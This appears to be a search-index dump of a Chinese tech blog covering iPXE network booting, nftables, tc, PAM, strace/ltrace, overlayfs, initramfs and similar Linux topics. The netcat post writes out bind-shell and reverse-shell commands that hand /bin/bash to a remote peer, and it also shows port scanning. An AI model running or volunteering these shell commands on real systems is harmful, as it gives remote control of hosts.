快取\nWebSocket协议入门介绍\nServer-Sent Events 教程\nHTTP／1.0／1.1／2.0的区别以及http和https的区别\n","categories":["Rails","FAQ"]},{"title":"用docker compose建一個ipxe的server","url":"/2021/10/ipxe-and-winpe/","content":"動機\n就是把windows與ubuntu的安裝整合在一起 (都是uefi)\n\nSol\n整體結構\n\ndhcp回dhcp-boot，讓client拉ipxe的執行檔\nipxe透過tftp拉真正的menu，ipxe在透過http拉需要的東西\n\ngeneral: kernel要知道怎麼透過網路去找安裝程式，所以下面就有兩種方式\n\n一個shell給你作事 (winpe)\n有魔改的kernel，裡面放url (netboot)，或是透過kernel args傳nfs\n\n\nwindows:\n\n透過wimboot引導winpe\nwinpe再連到自己host windows iso的地方\n\n\nubuntu:\n\n就是load kernel與initrd\n之後裡面魔改後kernel與initrd會去ubuntu拉ubuntu iso\n\n也因為魔改過(應該是initrd)，所以有自動回答文件\n\n可以看這裡\n\n\n\n\n\n\n\n\n\n網路\n這次是把 dhcp, tftp, web, router整合在同一台，只用一個網孔，因為我的respi2只有一個孔。\n所以整個網路就是電腦一個孔要吃兩個網路，有兩個方式\n\nip alias, vlan: 應該可以用，但我沒試\n從現有的net分幾個ip給dhcp發: 這裡用這個方法\n\n\n假設dhcp的假子網路: 192.168.81.20~192.168.81.25\n\n要處理snat，\niptables -P FORWARD ACCEPTiptables -t nat -A POSTROUTING -m iprange --src-range 192.168.81.20-192.168.81.25 -j MASQUERADE\ndhcpd\ndhcpd.conf\nddns-update-style none;ignore client-updates;  allow booting;allow bootp;  subnet 192.168.81.0 netmask 255.255.255.0 &#123;        range 192.168.81.20 192.168.81.25;        option broadcast-address 192.168.81.2;        option subnet-mask 255.255.255.0;        option domain-name-servers 8.8.8.8;            class &quot;pxeclients&quot; &#123;                  match if substring (option vendor-class-identifier, 0, 9) = &quot;PXEClient&quot;;                  next-server 192.168.81.160;                  filename &quot;ipxe.efi&quot;;          &#125;&#125;\ntftpd\ntftpd.remap\n都是因為window的斜線是反的!!\nrg \\\\ /\nnginx\n/etc/nginx/nginx.conf\n裡面的user要改成root，不然沒辦法掛在mnt\nuser  root;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;&#125;\n/etc/conf.d/default.conf\nserver &#123;        listen 80 default_server;        listen [::]:80 default_server;        root /var/www/html;        index index.html index.htm index.nginx-debian.html;        server_name _;        location / &#123;                autoindex on;                autoindex_exact_size off;                autoindex_format html;                autoindex_localtime on;                root /mnt/;        &#125;&#125;\nipxe\nclone code\nsudo apt-get install -y git gcc make liblzma-devgit clone https://github.com/ipxe/ipxe.gitcd ipxe/src\nembed.ipxe\n#!ipxedhcpchain tftp://$&#123;next-server&#125;/main.ipxe || shell\n編ipxe\nmake bin-x86_64-linux/ipxe.pxe EMBED=embed.ipxe\nmain.ipxe\n#!ipxe# dhcpset http-root           http://$&#123;next-server&#125;# Some menu defaultsset menu-timeout 5000set submenu-timeout $&#123;menu-timeout&#125;set menu-default ubuntu1804_inst:startmenu iPXE boot menuitem --gap --                   ---------------------------- Installers ----------------------------------item --key u    ubuntu_inst         Install Ubuntuitem --key e    windows10_uefi_inst          Install Windows 10item --gap --                   ------------------------- Advanced options -------------------------------item            shell                   Drop to iPXE shellitem            reboot                  Rebootitemitem --key x    exit                    Exit iPXE and continue BIOS bootchoose --timeout $&#123;menu-timeout&#125; --default $&#123;menu-default&#125; selected || goto cancelset menu-timeout 0goto $&#123;selected&#125;:cancelecho You cancelled the menu, dropping you to a shell:shellecho Type &#x27;exit&#x27; to get the back to the menushellset menu-timeout 0set submenu-timeout 0goto start:rebootreboot:exitexit:windows10_uefi_instkernel $&#123;http-root&#125;/windows/wimbootinitrd $&#123;http-root&#125;/windows/BCD         BCDinitrd $&#123;http-root&#125;/windows/boot.sdi    boot.sdiinitrd $&#123;http-root&#125;/windows/boot.wim boot.wimboot:ubuntu_instkernel $&#123;http-root&#125;/ubuntu/linux initrd=initrd.gzinitrd $&#123;http-root&#125;/ubuntu/initrd.gzboot\n資料夾結構\n\n/\n\nfiles\n\nweb\n\nwindows\n\nboot.wim: winpe的kernel\nwimboot: ipxe用來load winpe的魔法\nboot.sdi: winpe的ramdisk\nBCD: windows的bootloader\n\n\nubuntu\n\nlinux: ubuntu的netboot kernel\n\ndownload now\n\n\ninitrd.gz: ubuntu的netboot initramfs\n\ndownload now\n\n\n\n\n\n\ntftpd\n\nmain.ipxe\nipxe.efi\n\n\n\n\nconfs\n\ntftpd\n\ntftpd.remap\n\n\nnginx\n\nnginx.conf\ndefault.conf\n\n\ndhcpd\n\ndhcpd.conf\n\n\n\n\n\n\n\ndocker compose\ndocker的server一般要知道要開什麼port，但如果懶就用--net host，在compose就用network_mode: host\n附上常用的docker指令\n\n創container (d是detach, v是volume)\n\ndocker run -d --name &lt;container name&gt; --net host -v &lt;host path&gt;:&lt;container path&gt; &lt;image name&gt;\n\n\ndebug需要 (f就是tail的f)\n\ndocker logs -f &lt;container name&gt;\ndocker-compose logs -f\n\n\n連進去確認container狀況\n\ndocker exec -it &lt;container name&gt; /bin/sh\n\n\n直接關掉與刪掉container (f是force)\n\ndocker rm -f &lt;container name&gt;\n\n\n\nservices:  dhcpd:    image: networkboot/dhcpd    network_mode: host    volumes:      - /confs/dhcpd:/data  tftpd:    image: 3x3cut0r/tftpd-hpa    ports:      - &quot;69:69/udp&quot;    volumes:      - /files/tftpd:/tftpboot      - /confs/tftpd/tftpd.remap:/mapfile    environment:      MAPFILE: /mapfile  nginx:    image: nginx:alpine    ports:      - &quot;80:80&quot;    volumes:      - /confs/nginx/nginx.conf:/etc/nginx/nginx.conf      - /confs/nginx/default.conf:/etc/nginx/conf.d/default.conf      - /files/web:/mnt\n坑\n不要用dnsmasq\n雖然說dhcp, tftp都有，但是不知道為什麼在winpe的uefi開機時都會出事\ndhcp好像有錯，同時tftp不能remap，所以只能用別款\n不要用virtualbox實驗\nvirtualbox的nat網路不是真正的nat，要自己創nat網路…\n雖說原本的nat支援pxe，但實際上無法用自己網路來構成pxe開機，只能算是模擬\n每次都重建一台vm\n有遇到winpe一直卡在wpeinit的事，但是自從每次都重建要被裝os的vm來實驗後就沒遇過了\n直接用iscsi掛iso去boot不work\n因為轉到iscis之後，雖然是iso的執行環境，\n但iso還要從iso載入其他檔案，會因為不知道iscsi的target在哪，就直接出事。\nRef\nwhy-are-my-two-virtual-machines-getting-the-same-ip-address\n解决Nginx出现403 forbidden\nis-it-possible-to-have-a-root-path-containing-spaces-in-my-nginx-conf\nbuild ipxe\niPXE编译增加功能与自定义脚本\n折腾网络启动（2）iPXE 篇\n","categories":["Small project","Docker","Tips"]},{"title":"linux debug工具 part1","url":"/2021/10/linux-debug1/","content":"動機\n整理一些linux debug工具\n\n之前提過\nsystemtap與bpf就像是手術刀，可以看到很詳細的部分\n但在在那之前我們還是要看原本的程式或是kernel的log\nramoops\n要先提pstore(persistent storage)，讓kernel panic或是oops的log可以被存起來，讓userspace可以透過firesystem去讀log\nramoops就是配合pstore把log存在ram中\n使用方式\n\n開flag\n\nCONFIG_PSTORE=yCONFIG_PSTORE_CONSOLE=yCONFIG_PSTORE_FTRACE=yCONFIG_PSTORE_RAM=y\n\ncat /sys/fs/pstore/console-ramoops\n\ndebugfs\nprocfs: 讓userspace可以與process交換資訊的filesystem\nsysfs: 讓userspace可以與device交換資訊的filesystem\ndebugfs: 讓userspace可以與kernelspace的物件交換資訊的filesystem\n都是與kernelspace的物件交換資訊的filesystem，重點是範疇不同\n用法\nmount -t debugfs none /sys/kernel/debug\ndynamic_debug\nkernel有printk，但是開了就很難關，所以有dynamic_debug，可以指定要開哪一行，甚至是哪一個thread的哪一行\nmatch-spec* flags-spec\nmatch-spec ::= &#x27;func&#x27; string | # svc_tcp_accept, *recv*               &#x27;file&#x27; string |  # drivers/usb/*, inode.c:start_*, inode.c:1-100               &#x27;module&#x27; string | # drm*, nfsd               &#x27;format&#x27; string | # 一般的string search               &#x27;line&#x27; line-rangeline-range ::= lineno |               &#x27;-&#x27;lineno |               lineno&#x27;-&#x27; |               lineno&#x27;-&#x27;linenolineno ::= unsigned-int\n用法\n\n先開debugfs\necho 'file $file_name -p' &gt; /sys/kernel/debug/dynaminc_debug/control\n\nto be continued\nsystemtap與bpf，需要知道一定的語法與對probe的了解才能用\n也需要對kernel的版本有要求，或是裝專門的軟體，換言之就是不太方便用\n之後會看strace與lstrace怎麼用\nRef\nAndroid7.1 RK3399 使用 ramoops 机制查看开机 Kernel Log\nDynamic debug\nDay29 procfs, sysfs, debugfs\n","categories":["System","Linux","Tips"]},{"title":"ltrace-strace","url":"/2021/10/ltrace-strace/","content":"動機\n接著說說strace與ltrace\n\nstrace &amp; ltrace\n用法:\nstrace -e &#123;syscall_want_to_trace,...&#125; &#123;cmd &amp; its args&#125;\nltrace -e &#123;syscall_want_to_trace,...&#125; &#123;cmd &amp; its args&#125;\nstrace會列出syscall，ltrace是列出lib 的 function call\n兩個都是透過ptrace來完成\nstrace與ltrace是透過ptrace讓發生事件時讓process停下來\nptrace\nptrace是linux的process debug框架，在thread發生下面的case發生時回報給追蹤者(process)\n\n收到signal (除了SIGKILL)\n\n可以攔截singal，進而轉發、送新signal\n\n\n跑syscall\n跑到被ptrace參數指定的事件\n被停下來時\n\nptrace的流程是\n\n登記 (PTRACE_ATTACH, PTRACE_SEIZE, PTRACE_TRACEME(對象是child))\n設參數\nwaitpid\n取得在意的資料\nPTRACE_CONT\n\nstrace需要PTRACE_ATTACH、PTRACE_SYSCALL，所以下面就看這兩項\nPTRACE_ATTACH\n一開始先登記\n\n先到泛用的ptrace syscall\n之後開始檢查被trace的程式能不能用ptrace，之後替該process上被attach的flag\n之後根據流程，ptrace會跑到arch-specific的ptrace code\n\n但沒有PTRACE_ATTACH事就直接退出\n\n\n這個時候被trace的程式會停下來\n\nPTRACE_SEIZE\n與PTRACE_ATTACH很像，但是PTRACE_SEIZE不會讓process停下來，PTRACE_ATTACH會先讓process停下來\n所以做PTRACE_SEIZE的同時可以加上ptrace的參數，PTRACE_ATTACH因為會先stop，所以要等到對方停了才可以另外加ptrace的參數\nPTRACE_SYSCALL\n登記好了就讓他跑吧\n\n先到泛用的ptrace syscall\n之後開始檢查被trace的程式能不能用ptrace，之後替該process上被attach的flag\n之後根據流程，ptrace會跑到arch-specific的ptrace code\n\n會call ptrace_resume，之後再thread上打TIF_SYSCALL_TRACE的flag\n\n\n被trace的程式就開始跑\n\ncall system call了\n\n在執行system call的程式中會看有沒有TIF_SYSCALL_TRACE或是其他在此無關的flag，有就會call tracesys\ntracesys中會看有沒有TIF_SYSCALL_TRACE，有就call ptrace_report_syscall\nptrace_report_syscall會\n\n用SIGTRAP kill 被trace的程式，讓他停下來\n執行trace的程式會被通知，就可以看需要的東西了\n\n\n\nltrace &amp; interrupt 3\n如果不想看syscall只想看function call怎麼辦?\ninterrupt 3 (software breakpoint)\n執行後，kernel會用SIGTRAP kill執行interrupt 3的process\n所以這樣ptrace看的到，但要怎麼插入interrupt 3?\nPTRACE_POKETEXT &amp; the Procedure Linkage Table (PLT) and the Global Offset Table (GOT)\nPTRACE_POKETEXT可以讓ptrace插入code，可以用他插入interrupt 3\nprocess(ELF)有\n\nGlobal Offset Table (GOT): shared lib的位置\nProcedure Linkage Table (PLT): 紀錄怎麼call function的code\n\n如果是shared lib就是變成調用linker\nlinker找到後會把位置填到GOT，跑function\n之後的同一個function call就是找GOT上寫的位置直接call function\n\n\n\nltrace = irq 3 + PTRACE_POKETEXT\n\n先登記 (attach)\n查PLT，用PTRACE_POKETEXT插入interrupt 3\n讓被trace的程式開始跑\n之後就是SIGTRAP\n等結束後，再用PTRACE_POKETEXT把原本的code插回去\n\nRef\nHow does strace work?\nHow does ltrace work?\nUnderstanding ptrace\nptrace man\n","categories":["System","Linux","Tips"]},{"title":"macro與條件式編譯","url":"/2021/10/macro-cond-compile/","content":"動機\n已經忘了當初是遇到什麼鍋，但是有留紀錄說要寫下來\n\nmacro(metaprogram) &amp; program 的不同\nmacro是操作程式碼，所以程式碼不是所見及所得\n* Macros have no namespace\n* Macros have effects you don’t realize &amp; have strange side effects\n* Macros can’t be debugged\n* 沒有printf, gdb\nprogram是操作定義在program的資料，程式碼怎麼寫就怎麼動(不考慮side effect與system的鍋)\n條件式編譯與ci\n寫程式的可以自己定義條件式編譯，結果ci沒有跟上新加的編譯，導致ci沒有檢查到新的編譯，讓ci整個沒有用\n解法\n\n用enum, const\n用function、與include、inline\n把條件式編譯的參數拆成\n\n不同branch\n用設定檔讀參數\n\n\n\n重點: macro中不能有business logic在\n","categories":["C++","Tips","Utils","CI","Tips"]},{"title":"netcat的基本用法","url":"/2021/10/netcat-basic/","content":"動機\nnetcat就是simple的tcp/udp socket\n重點是很方便，一行就可以把client與server建好!!\n\n基本用法\n\nserver\n\nnc -l -p [port]\n\n-l: listen\n-p: 當成listen的port\n\n\n\n\nclient\n\nnc -vv -n -w 1 [remote ip] [port] -p [source port]\n\n-n: 不要用dns，如果打的是ip，一定要用這個!!\n-w 1: 1秒後沒有任何輸入就停止\n\ngnu-netcat，不知道為什麼就是不會停?\nopenbsd-netcat就會停\n\n\n-p: source port\n-vv: very verbose!!\n\n\n\n\n連線建好後\n\n就可以一直傳資料\n\n-z: 不傳任何資料!! 就是port scan\n\nnc -zv [ip] [port1]-[port2] [port3]-[port4]\n\n\n\n\n上面就是輸出輸入都是到stdin與stdout\n\n-e: 可以把stdin與stdout導到程式\n\n讓程式處理input與output\n\n\n\n\n預設是tcp\n\n-u: udp\n\n\n\n\n\n用法\n\nshell\n\nnc -l -p [port] -e /bin/bash\n\n讓bash去回應request\n\n\nnc -l [remote ip] [port]\n\nclient可以輸入指令，來用server的bash\n\n\n\n\nreverse shell\n\nnc -l -p [port]\n\nserver可以輸入(指令，來用client的bash)\n\n\nnc -l [remote ip] [port] -e /bin/bash\n\n讓bash去回應request\n\n\n\n\n傳檔案\n\nnc -l -p [port] &gt; outfile\ncat thefile | nc -v -n -w 1 [remote ip] [port]\n因為是透過stdin與stdout，所以可以與其他指令結合\n\ndd\ntar\n\n\n\n\n小server\n\nwhile true; do nc -l -p [port] &lt; index.html; done\n\n\n\nRef\nNetcat Cheat Sheet\nNetcat（Linux nc 指令）網路管理者工具實用範例\n","categories":["Network","Tips"]},{"title":"network的traffic control","url":"/2021/10/network-tc/","content":"動機\n以前遇過，review一下\n\n概念\n一般做tc就是在意下面4件事\n\nPOLICING(策略)\n\n進來的pkt要到哪邊\n\nqueue的入口\n\n\n\n\nSCHEDULING(調度)\n\n怎麼分配bandwidth (QoS)\n\nqueue的內部\n\n\n\n\nSHAPING (限制)\n\n調整輸出的速度\n\nqueue的出口\n\n\n\n\nDROPPING(丟棄)\n\n爆量了怎麼辦\n\n\n\n\ntraffic control就是一個queue接一個queue，變成一個樹狀queue，有三個元件\n\nqdisc\n\nquene (virtual)\n\ntree的node (特別是能放class的qdisc)\n\nleaf (classless)\nnode (classful，會多兩個元件)\n\nfilter\n\n(另外加的) 要讓traffic去哪 (class或qdisc)\n\n有點像goto\n\n\n\n\nclass\n\n下一個qdisc的入口，目前qdisc的出口\n\nnode的pointer\n\n\n\n\n\n\n\n\n\n\n\n\n\n樹狀queue就是qdisc指到2種東西\n\nclass\nqdisc (classless)\n另外就是符合條件(filter)直接被指到\nclass\nqdisc (classless)\n\n\nclassless &amp; classful qdisc\n就qdisc能不能放class\n\nclassless\n\npfifo: 一般的queue\npfifo_fast: 根據ToS去分到對應的一般的queue\nred: 爆量時隨機drop\nsfq: Stochastic Fairness Queueing\ntbf: Token Bucket Filter\n\n\nclassful\n\ncbq: Class Based Queueing\nhtb: Hierarchy Token Bucket\n\n\n\ningress qdisc &amp; ifb\nifb，tc作用在egress(從主機出去的traffic)，如果要用在ingress，就要設ifb把traffic灌進去，把tc設定ifb的egress\n\n# init ifbmodprobe ifb numifbs=1ip link set ifb0 up#  redirect ingress to ifb0tc qdisc add dev eth0 ingress handle ffff:tc filter add dev eth0 parent ffff: protocol ip prio 0 u32 match u32 0 0 flowid ffff: action mirred egress redirect dev ifb0# add qdisctc qdisc add dev ifb0 root handle 1: htb default 2 r2q 100# add default classtc class add dev ifb0 parent 1:0 classid 1:1 htb rate 1000mbit ceil 1000mbittc class add dev ifb0 parent 1:1 classid 1:2 htb prio 5 rate 1000mbit ceil 1000mbittc qdisc add dev ifb0 parent 1:2 handle 2: pfifo limit 500# add default filtertc filter add dev ifb0 parent 1:0 prio 5 protocol ip u32tc filter add dev ifb0 parent 1:0 prio 5 handle 4: protocol ip u32 divisor 256tc filter add dev ifb0 parent 1:0 prio 5 protocol ip u32 ht 800:: match ip dst 192.168.0.0/16 hashkey mask 0x000000ff at 16 link 4:# add ingress rules for 192.168.0.9tc class add dev ifb0 parent 1:1 classid 1:9 htb prio 5 rate 3mbit ceil 3mbittc qdisc add dev ifb0 parent 1:9 handle 9: pfifo limit 500tc filter add dev ifb0 parent 1: protocol ip prio 5 u32 ht 4:9: match ip dst &quot;192.168.0.9&quot; flowid 1:9\nsharping的原理\nLeaky Bucket: 把流量queue住，一次只出去指定的量\n\nToken Bucket: 把流量queue住，等有token才能出去同等數量的traffic\n\nhtb就是parent的token可以轉給小孩用\n\n\nsharping的作法\n用netem\ntc qdisc add dev enp0s5 root handle 1: priotc qdisc add dev enp0s5 parent 1:1 handle 10: netem delay 100ms 10mstc filter add dev enp0s5 protocol ip parent 1:0 prio 1 u32 match ip dst 151.101.0.0/16 match ip dport 443 0xffff flowid 1:1\n用htb\ntc qdisc add dev enp0s5 root handle 1:0 htbtc class add dev enp0s5 parent 1: classid 1:1 htb rate 100kbps ceil 100kbps\nRef\nLinux TC(Traffic Control)框架原理解析\nLinux Traffic Control (tc) 研究\n流量控制\nTC 入門 (traffic control)\n","categories":["Network","Tips"]},{"title":"nftables","url":"/2021/10/nftables/","content":"動機\n記錄用\n\n基本概念\n\ntable: chain與各式data structrue的收納庫，定義旗下的chain收什麼類型的封包(family)\n\nfamily\n\nip: ipv4\nip6: ipv6\narp: arp\nbridge: 在linux bridge的pkt\ninet = ip + ip6\nnetdev: interface的pkt\nchain: 就有一堆rule，由type與hook決定這個chain在哪發揮作用\n\n\ntype: 說明這個chain處理哪個方面的工作\n\nfilter: 就是filter\n\narp, bridge, ip, ip6, inet, netdev\n\n\nroute: Mark packets\n\nip, ip6, inet\n\n\nnat: Perform Network Address Translation\n\nip, ip6, inet\n\n\n\n\nhook: 裡面的rule會掛在netfilter的那個hook上\n\nip, ip6, inet: prerouting, input, forward, output, postrouting\narp: input, output\nnetdev: ingress (這個是例外，這不在原本的netfilter)\nbridge: prerouting, input, forward, output, postrouting (這個是例外，這不在原本的netfilter)\n\n\n\nnftable一個做得好的是把chain與hook分開了\n所有XXtables都是照netfilter去掛hook做packet過濾，但是之前都是會事先綁好，導致真的不好懂，也不知道為什麼要這麼做\nnetfilter hooks\n基本操作\n\n全清掉: nft flush ruleset\n刪table: nft delete table ip mytable\n列所有table: nft list tables\n列table裡面有的東西: nft list table ip mytable -n -a\n\n-n -a: 是為了show handle，就是iptables的rule位置(index)\n\n\n插rule: nft insert rule mytable mychain position 8 ip daddr 127.0.0.8 drop\n\ninsert before handle 8\n\n\n塞rule到第一個: nft insert rule mytable mychain ip daddr 127.0.0.8 drop\n刪rule: nft delete rule mytable mychain handle 8\n\n特別注意!!\n\n現在nft的錯誤訊息做的十分不好，不論什麼錯都是找不到對應的檔案的err msg，所以要\n\n一條一條的下\nfamily都要打出來\n\n\n\n加規則\n\nnft verb\n\nfamily table\n\nchain …\n\n\nfamily table chain\n\nconditions\n\nip saddr ip …\n\n\n\n\n\n\n\n下面是同一個rule的兩種下法\nnft add table ip mytablenft add chain ip mytable mychain &#123; type filter hook output priority 0 \\; policy accept \\; &#125;nft add rule ip mytable mychain ip saddr 192.168.12.23 tcp dport 1234 drop\ndefine myaddr = &quot;192.168.12.23&quot;table ip mytable &#123;    chain mychain &#123;        type filter hook output priority 0;        policy accept;        ip saddr $myaddr tcp dport 1234 drop    &#125;&#125;\n只有type要加分號，其他都不用\n剩下還有很多condition可以下，可以去參考Quick reference-nftables in 10 minutes\n接著介紹其他有點程式語言的功能\ndata structrue\nsymbol var\n就是macro展開\ndefine myaddr = 192.168.12.23table ip mytable &#123;    chain chain2 &#123;        type filter hook output priority 0;        policy accept;        ip saddr $myaddr tcp dport 1234 drop    &#125;&#125;\nset\nnft add set ip mytable myset &#123; type ipv4_addr \\; &#125;nft add element ip mytable myset &#123; 192.168.1.4, 192.168.1.5 &#125;nft add rule ip mytable mychain ip saddr @myset\nattributes\ntype &amp; typeof\nipv4_addr: IPv4 address\nipv6_addr: IPv6 address.\nether_addr: Ethernet address.\ninet_proto: Inet protocol type.\ninet_service: Internet service (read tcp port for example)\nmark: Mark type.\nifname: Network interface name (eth0, eth1…)\ntable inet mytable &#123;\tset s1 &#123;\t\ttypeof osf name\t\telements = &#123; &quot;Linux&quot; &#125;\t&#125;\tset s2 &#123;\t\ttypeof vlan id\t\telements = &#123; 2, 3, 103 &#125;\t&#125;\tset s3 &#123;\t\ttypeof ip daddr\t\telements = &#123; 1.1.1.1 &#125;\t&#125;&#125;\nflags\nconstant - set content may not change while bound\ninterval - set contains intervals\ntimeout - elements can be added with a timeout\nnft add set ip mytable myset &#123; type ipv4_addr \\; flags constant, interval \\; &#125;\nmeter\ndynamic - make a meter!!\nnft add set my_filter_table my_ssh_meter &#123; type ipv4_addr\\; flags dynamic \\;&#125;nft add rule my_filter_table my_input_chain tcp dport 22 ct state new add @my_ssh_meter &#123; ip saddr limit rate 10/second &#125; accept\netc\nsize: mits the maximum number of elements of the set\npolicy: set selection policy\n* performance (default)\n* memory\nelements: initialize the set with some elements in it\nnft add set ip filter daddrs &#123;type ipv4_addr \\; flags timeout \\; elements=&#123;192.168.1.1 timeout 10s, 192.168.1.2 timeout 30s&#125; \\;&#125;\nmap\nnft add map ip mytable porttoip  &#123; type inet_service: ipv4_addr\\; &#125;nft add element ip mytable porttoip &#123; 80 : 192.168.1.100, 8888 : 192.168.1.101 &#125;nft add rule ip mytable postrouting snat to tcp dport map @porttoip\nVerdict Maps\nvalue是action\ntable ip filter &#123;    chain input &#123;                type filter hook input priority 0;                ip protocol vmap &#123; udp : jump udp-chain, tcp : jump tcp-chain, icmp : jump icmp-chain&#125;    &#125;    chain tcp-chain &#123;                counter packets 4 bytes 520    &#125;    chain udp-chain &#123;                counter packets 4 bytes 678    &#125;    chain icmp-chain &#123;                counter packets 4 bytes 336    &#125;&#125;\nnft add map filter mydict &#123; type ipv4_addr : verdict\\; &#125;nft add element filter mydict &#123; 192.168.0.10 : drop, 192.168.0.11 : accept &#125;nft add rule filter input ip saddr vmap @mydict\nConcatenations (tuple)\n把value或是條件用.連起來\nnft add rule ip mytable mychain ip saddr . ip daddr . ip protocol &#123; 1.1.1.1 . 2.2.2.2 . tcp, 1.1.1.1 . 3.3.3.3 . udp&#125; counter accept\n其他有用的資料結構\nflow table: 可以跳過linux stack的table，做offload\nConntrack helpers: 依據Conntrack去控制rule\nRef\nnftables Main page\nSetting up nftables Firewall\nQuick reference-nftables in 10 minutes\n","categories":["Network","Tips"]},{"title":"overlayfs","url":"/2021/10/overlayfs/","content":"動機\n記錄用\n\noverlayfs\n就是疊疊樂\n\nlower提供基底(通常是readonly或是另一個overlay)，upper提供可以寫的環境\noverlay就是兩個疊在一起結果\n用法\nmount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged\n* workdir: 就是暫存，要是空的folder\nreadonly overlay\n我只要把多個folder疊再一起怎麼辦?\nmount -t overlay overlay -o lowerdir=/lower1:/lower2 /merged\n用來疊客製化\nmount -t overlay overlay -o lowerdir=/mnt/sq,upperdir=/x/pers/rw,workdir=/x/pers/work /mnt/merged\nmksquashfs /mnt/merged /...\nRef\nOverlay filesystem\noverlayfs 練習： 小改光碟 iso 檔， 何必大手筆複製？\n","categories":["System","Linux","Tips"]},{"title":"pam的整理","url":"/2021/10/pam-tutorial/","content":"動機\n之前修arch上su不能用在homed上，有修pam的檔，所以紀錄一下pam\n\n統一的驗證\n就是程式需要認證時就丟給pam，pam會去找對應的conf，之後就是照著跑\n\n驗證有4個階段\n\nauth: 就是驗證帳密，看有沒有這帳號，以及這帳號的password或是token對不對\naccount: 確認account的訊息，像是能不能用這個service，或是簡單講就是確認權限\npassword: 檢查password本身的資訊，像太舊的密碼就會提示該換了\nsession: 前面該看的都過了，在實際讓user用service之前做的setup\n\nconf怎麼下\n階段 處理方式 pam_module args...\n\n階段: 前面提到的4個階段\npam_module: 就是這行要做什麼，\n\npam_deny: iptables的reject\npam_permit: iptables的accept\npam_rootok: 只要是root就給過\n\n\nargs就是pam_module的參數\n\n處理方式\n\n簡單版\n\n一定要過(module會傳成功)\n\nrequired: 不過，還是繼續往下做\nrequisite: 不過，直接整個失敗\n\n\n過了當然是ok的，但沒過沒差\n\nsufficient: 不過，還是繼續往下做\n\n\n過不過都沒差\n\noptional\n\n\n用寫好的\n\ninclude: 像macro，錯了就當成整個失敗\nsubstack: 像function，錯了就當成只有那一條失敗\n\n\n\n\n自訂版\n\n[value1=action1 value2=action2 ...]\n\nvalue就是module的err code\naction就是該做什麼\n\nignore: 當沒事\nreset: 把現在的階段忘了，直接從下一個階段的頭開始跑\n關於紀錄err code\n\nbad: 當成失敗，如果是第一個，跑到最後時以此err code回傳\ndie: 當成失敗，直接回傳err code\nok: 當成成功，只記錄最後一個ok的err code\ndone: 當成成功，直接回傳err code\n\n\n放數字，表示往後跳N個\n\n\n\n\n把簡單版展開\n\nrequired\n\n[success=ok new_authtok_reqd=ok ignore=ignore default=bad]\n\n\nrequisite\n\n[success=ok new_authtok_reqd=ok ignore=ignore default=die]\n\n\nsufficient\n\n[success=done new_authtok_reqd=done default=ignore]\n\n\noptional\n\n[success=ok new_authtok_reqd=ok default=ignore]\n\n\n\n\n\n\n\nRef\npam.d(5) - Linux man page\n","categories":["System","Linux","Tips"]},{"title":"讓PC成為手機的藍牙喇叭","url":"/2021/10/pc-as-andorid-speaker/","content":"動機\nYour phone真的很好用，但是沒辦法把手機的audio送回來\n\nSol\n\n裝Microsoft Store上的Bluetooth Audio Receiver\n\n\n建bluetooth A2DP的connection\n\n\n先把手機配對好\n在Bluetooth Audio Receiver選手機，連線就ok了\n\n","categories":["Windows","Tips"]},{"title":"拯救rm的檔案","url":"/2021/10/recover-rm/","content":"動機\n紀錄一下\n\nSol\n\n還有程式open著\n\nlsof | grep [file path]\n\nprogname PID user FD REG 8,1 16791251 265368 [file path]\n\n\ncp /proc/PID/fd/FD [recover path]\n\n\n沒有\n\n用最快的速度umount或remount成read-only\n\nmount -o remount,ro /dev/[partition]\numount /dev/[partition]\n\n\n根據filesystem用對應的工具去救(ext4)\n\nextundelete /dev/&lt;device-file&gt; --restore-all\n\n\n\n\n\n","categories":["Utils","Bash"]},{"title":"rootfs與initramfs (with WSL2的安裝)","url":"/2021/10/rootfs-initramfs/","content":"動機\n原本是為了裝arch的wsl2所以碰到rootfs，所以來整理一下\n\n複習開機流程\n\n按下電源\nBIOS做POST，去找bootloader\n\nPXE\ndisk\n\n\nbootloader載入 kernel 與 initramfs\ninitramfs，載入核心驅動，開始驅動硬體與提供作業系統資源\n\n從網路上面下載 kernel 與 initramfs 檔案\nkernel 開始在記憶體內解壓縮，然後執行 kernel 的硬體偵測、資源分配等開機程序\n將 initramfs 的內容(rootfs)解壓縮之後，暫時掛載成為根目錄\n開始執行 rootfs 內的 /init 執行檔 (可以是 script 的格式)\n\n\n捨棄 initramfs，掛載真正的根目錄，繼續後續的開機流程。\n\n預計掛載的根目錄 /etc/fstab 來重新 chroot 到正確的根目錄\n\n\n核心呼叫 systemd ，開始後續所有的應用程式啟用\n\nrootfs &amp; initramfs\nrootfs就是fs連同目錄結構連同裡面的所有資料，之後被打包成一個壓縮檔\ninitramfs是kernel啟動後mount的第一個filesystem，在mount去跑script把pid 1的程式(systemd)跑起來\n所以initramfs需要有?\n\npid 1的程式: 要在這上面跑\nrootfs: 提供之後的根目錄\n/etc/fstab: mount用的分區表\nscript的執行環境: 像busybox\n\nrootfs至少需要有?\n\n/etc/: 放config\n/bin/: 一般exe\n/sbin/: 管理員專用的exe\n/lib/: library與kernel module\n/dev/: device\n\n做一個initramfs與rootfs\n先做rootfs\n\n準備一個busybox\n把需要的東西塞到folder去\n寫initramfs被mount應該要做什麼事(init的script)\n\n裝busybox\nmount\n\nproc, sys\ndev\n在記憶體建立一塊區域放rootfs\n\n\n解壓縮、mount rootfs，chroot，跑第一個proc(像systemd)\n\n\n所以initramf會有 busybox(或類似的) 與 init的script\n\n做initramfs\n\n用cpio把上面的東西(busybox與script)包起來\n\n用rootfs裝WSL2\nWSL2本身就有自己的bootloader、iniramfs與類似systemd的東西\n所以如果想裝自己的發行版，就要把rootfs餵給wsl，讓wsl去讀\n但要注意的是wsl的rootfs是吃tar不是cpio\n\n找rootfs，像arch是在這裡\n重新包成tar\n\nunsquashfs -d temp airootfs.sfs\ntar -czf ../arch.tar.gz --hard-dereference *\n\n\n讓wsl去讀\n\nwsl.exe --import &lt;DistributionName&gt; 